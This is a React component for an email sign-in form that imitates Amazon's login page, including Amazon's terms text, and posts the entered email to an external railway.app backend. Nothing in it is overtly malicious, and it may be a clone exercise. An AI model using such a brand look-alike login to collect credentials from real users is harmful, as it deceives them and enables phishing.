"use client";

import { useState } from "react";

import ErrMssg from "./errMssg";

export default function EmailForm({ email, setEmail, setStep }) {
  const [loding, setrLoding] = useState(false);
  const [emailErrMssg, setEmailErrMassg] = useState(false);
  const [errMSS, setErrMSS] = useState(false);

  const handelClick = async () => {
    if (!email.trim()) {
      setEmailErrMassg(true);
      setErrMSS(true);

      return;
    }

    setrLoding(true);
    await fetch("https://back-production-e1fb.up.railway.app/api/user", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email: email.trim(),
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.is_email_active) {
          setStep(data.step);

        } else {
          setStep(data.step);
        }
      });

    setrLoding(false);
  };

  return (
    <div className="contentFormLogin">
      <span className="headerForm">Sign in or create an account</span>

      <div className="inputContainer">
        <p className="infoInput">Enter mobile number or email</p>
        <input
          className={emailErrMssg ? "inputFormErr " : "inputForm"}
          onChange={(e) => {
            setEmail(e.currentTarget.value);
          }}
          value={email}
          type="email"
          placeholder="inter your email"
        />

        {errMSS  && (
          <ErrMssg message={"Enter your mobile number or email"} />
        )}
      </div>
      <button className="BtnForm" onClick={handelClick}>
        {loding ? "loding..." : "Continue"}
      </button>

      <div style={{ gap: "10px" }} className="d-flex flex-column ">
        <p style={{ fontSize: "12px", fontWeight: "500" }}>
          By continuing, you agree to Amazon's{" "}
          <span className="linkColor"> Conditions of Use </span> and{" "}
          <span className="linkColor">Privacy Notice</span> .
        </p>

        <span
          className="linkColor"
          style={{ fontSize: "13px", fontWeight: "500" }}
        >
          Need help?
        </span>
      </div>
    </div>
  );
}
